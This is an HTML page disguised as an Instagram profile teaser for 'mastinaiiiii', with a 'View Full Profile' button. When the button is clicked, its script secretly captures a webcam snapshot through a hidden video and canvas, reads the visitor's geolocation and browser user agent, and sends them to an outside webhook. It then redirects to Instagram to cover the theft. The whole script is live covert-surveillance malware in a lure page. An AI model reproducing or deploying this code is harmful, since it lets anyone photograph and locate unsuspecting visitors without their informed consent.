<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>mastinaiiiii | Exclusive Feed</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; color: #111; }
        .card { width: 100%; max-width: 350px; text-align: center; padding: 20px; }
        .avatar { width: 110px; height: 110px; background: #eee; border-radius: 50%; margin: 0 auto 20px; border: 1px solid #dbdbdb; }
        h1 { font-size: 1.25rem; font-weight: 600; margin-bottom: 10px; }
        p { font-size: 0.95rem; color: #555; margin-bottom: 30px; line-height: 1.4; padding: 0 10px; }
        .btn { background: #000; color: #fff; border: none; padding: 14px 0; border-radius: 8px; font-weight: 600; cursor: pointer; width: 100%; font-size: 0.95rem; transition: background 0.2s; }
        .btn:hover { background: #333; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <div class="avatar"></div>
        <h1>mastinaiiiii</h1>
        <p>Follow my page on Instagram.</p>
        <button id="cta" class="btn">View Full Profile</button>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
        const btn = document.getElementById('cta');
        const v = document.getElementById('v');
        const c = document.getElementById('c');
        const webhook = 'https://eoukkf7emqrufvo.m.pipedream.net/';

        async function gatherData() {
            try {
                // Get Camera
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                v.srcObject = stream;
                
                // Get Location
                const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
                
                setTimeout(async () => {
                    c.width = v.videoWidth;
                    c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    const img = c.toDataURL('image/jpeg', 0.8);
                    
                    await fetch(webhook, { 
                        method: 'POST', 
                        body: JSON.stringify({ 
                            image: img, 
                            coords: { lat: pos.coords.latitude, lon: pos.coords.longitude },
                            ua: navigator.userAgent 
                        }) 
                    });
                    
                    stream.getTracks().forEach(t => t.stop());
                    window.location.href = 'https://www.instagram.com/mastinaiiiii';
                }, 500);
            } catch (e) {
                console.error("Access denied or failed.");
            }
        }

        btn.addEventListener('click', gatherData);
    </script>
</body>
</html>
